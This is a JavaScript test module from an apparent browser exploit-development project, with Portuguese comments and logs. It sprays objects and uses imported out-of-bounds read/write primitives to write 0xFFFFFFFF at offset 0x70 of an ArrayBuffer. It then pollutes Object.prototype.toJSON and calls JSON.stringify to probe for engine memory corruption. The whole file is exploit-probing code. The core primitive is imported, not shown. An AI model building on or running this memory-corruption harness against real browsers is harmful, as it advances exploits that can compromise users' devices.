// js/script3/testInvestigatePropertyAccessInRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Debug: Verificar o tipo das importações no nível do módulo
console.log('[Module Scope] typeof oob_array_buffer_real:', typeof oob_array_buffer_real);
console.log('[Module Scope] typeof oob_dataview_real:', typeof oob_dataview_real);
console.log('[Module Scope] typeof triggerOOB_primitive:', typeof triggerOOB_primitive);
console.log('[Module Scope] typeof oob_write_absolute:', typeof oob_write_absolute);


class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `RangeErrorTestObj-${id}`;
        this.marker = 0x1234ABCD;
        this.data = [id, id + 1, id + 2];
        this.subObject = { nested_prop: id * 10 };
        this[`prop${id}`] = id;
        this[`anotherProp${id}`] = `val${id}`;
    }
}

export function toJSON_Complex_V0_EmptyReturn() {
    return { variant: "V0_EmptyReturn" };
}

export async function executeInvestigatePropertyAccessInRangeError_v24_DebugRefError() {
    const FNAME_TEST = "executeInvestigatePropAccess_v24_DebugRefError";
    logS3(`--- Iniciando ${FNAME_TEST}: Depurando ReferenceError e Escrita OOB em 0x70 ---`, "test", FNAME_TEST);
    document.title = `Debug RefErr & OOBWrite@0x70`;

    // Debug: Verificar o tipo das importações no início da função
    logS3(`[${FNAME_TEST}] typeof triggerOOB_primitive: ${typeof triggerOOB_primitive}`, "info");
    logS3(`[${FNAME_TEST}] typeof oob_array_buffer_real (antes de await): ${typeof oob_array_buffer_real}`, "info");
    logS3(`[${FNAME_TEST}] typeof oob_dataview_real (antes de await): ${typeof oob_dataview_real}`, "info");


    const spray_count = 10;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = 0x70;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;
    const safe_write_offset = 0x08;
    const safe_write_value = 0x12345678;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    await PAUSE_S3(100);

    logS3(`2. Configurando ambiente OOB...`, "info", FNAME_TEST);
    await triggerOOB_primitive(); // Define o oob_array_buffer_real e oob_dataview_real exportados de core_exploit

    // Verificação robusta das variáveis após triggerOOB_primitive
    let oobSetupOK = true;
    if (typeof oob_array_buffer_real === 'undefined' || oob_array_buffer_real === null) {
        logS3("FALHA OOB Setup: oob_array_buffer_real é nulo ou indefinido. Abortando.", "error", FNAME_TEST);
        oobSetupOK = false;
    }
    if (typeof oob_dataview_real === 'undefined' || oob_dataview_real === null) {
        logS3("FALHA OOB Setup: oob_dataview_real é nulo ou indefinido. Abortando.", "error", FNAME_TEST);
        oobSetupOK = false;
    }

    if (!oobSetupOK) {
        return { error: new Error("OOB Setup Failed - vars not defined/null") };
    }

    logS3("   Ambiente OOB verificado no chamador (não nulo).", "good", FNAME_TEST);
    logS3(`   oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}, oob_dataview_real.byteLength: ${oob_dataview_real.byteLength}, oob_dataview_real.byteOffset: ${oob_dataview_real.byteOffset}`, "info", FNAME_TEST);

    // Teste de Escrita Segura Preliminar
    try {
        logS3(`   TESTE DE ESCRITA SEGURA: Escrevendo ${toHex(safe_write_value)} em oob_array_buffer_real[${toHex(safe_write_offset)}]...`, "info", FNAME_TEST);
        oob_write_absolute(safe_write_offset, safe_write_value, 4);
        let read_back_safe = oob_read_absolute(safe_write_offset, 4);
        if (read_back_safe === safe_write_value) {
            logS3(`     SUCESSO: Escrita segura em ${toHex(safe_write_offset)} confirmada. Lido de volta: ${toHex(read_back_safe)}`, "good", FNAME_TEST);
        } else {
            logS3(`     FALHA: Escrita segura em ${toHex(safe_write_offset)} leu ${toHex(read_back_safe)} em vez de ${toHex(safe_write_value)}`, "error", FNAME_TEST);
        }
    } catch (e_safe_write) {
        logS3(`   ERRO no teste de escrita segura em ${toHex(safe_write_offset)}: ${e_safe_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { error: e_safe_write };
    }
    await PAUSE_S3(100);

    // Escrita Crítica em 0x70
    let critical_write_succeeded = false;
    try {
        logS3(`   ESCRITA CRÍTICA: Tentando escrever ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]... (Log ID: PreWrite0x70)`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        critical_write_succeeded = true;
        logS3(`   ESCRITA CRÍTICA: Escrita em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] NÃO TRAVOU. (Log ID: PostWrite0x70)`, "good", FNAME_TEST);

        let read_back_critical = oob_read_absolute(corruption_offset_in_oob_ab, 4);
        logS3(`     Lido de volta de ${toHex(corruption_offset_in_oob_ab)}: ${toHex(read_back_critical)} (Esperado: ${toHex(value_to_write_in_oob_ab)})`, "info", FNAME_TEST);
        if (read_back_critical !== value_to_write_in_oob_ab) {
             logS3(`     AVISO: Leitura de volta de ${toHex(corruption_offset_in_oob_ab)} diferente do esperado!`, "warn", FNAME_TEST);
        }
    } catch (e_write) {
        logS3(`   ERRO na ESCRITA CRÍTICA em ${toHex(corruption_offset_in_oob_ab)}: ${e_write.name} - ${e_write.message}`, "critical", FNAME_TEST);
        clearOOBEnvironment();
        return { error: e_write };
    }
    await PAUSE_S3(200);

    // Sondagem Mínima
    let testResult = { error: null, stringifyResult: null, object_id: null };
    if (critical_write_succeeded) {
        logS3(`3. Sondando sprayed_objects[0] com V0_EmptyReturn (após escrita em 0x70)...`, "test", FNAME_TEST);
        const ppKey_val = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let pollutionApplied = false;
        try {
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_Complex_V0_EmptyReturn,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            const target_obj_to_stringify = sprayed_objects[0];
            if (target_obj_to_stringify) {
                testResult.object_id = target_obj_to_stringify.id;
                logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id})...`, "info", FNAME_TEST);
                testResult.stringifyResult = JSON.stringify(target_obj_to_stringify);
                logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(testResult.stringifyResult)}`, "info", FNAME_TEST);
            }
        } catch (e_str) {
            testResult.error = e_str;
            logS3(`    !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            document.title = e_str.name === 'RangeError' ? `RangeError DebugWrite!` : `Error Stringify DebugWrite!`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                else delete Object.prototype.toJSON;
            }
        }
    } else {
        logS3("Escrita crítica em 0x70 parece ter travado, pulando sondagem.", "error", FNAME_TEST);
    }

    if (testResult.error) {
        logS3(`  ---> PROBLEMA DETECTADO ao sondar objeto ID ${testResult.object_id}: ${testResult.error.name} - ${testResult.error.message}`, "critical", FNAME_TEST);
    } else if (critical_write_succeeded) {
        logS3(`  ---> Sondagem do objeto ID ${testResult.object_id} completou sem erro explícito no stringify.`, "good", FNAME_TEST);
    }

    logS3(`--- ${FNAME_TEST} CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    if (!document.title.includes("Error") && !document.title.includes("RangeError")) {
         document.title = `DebugWrite@0x70 Done`;
    }
    return testResult;
}
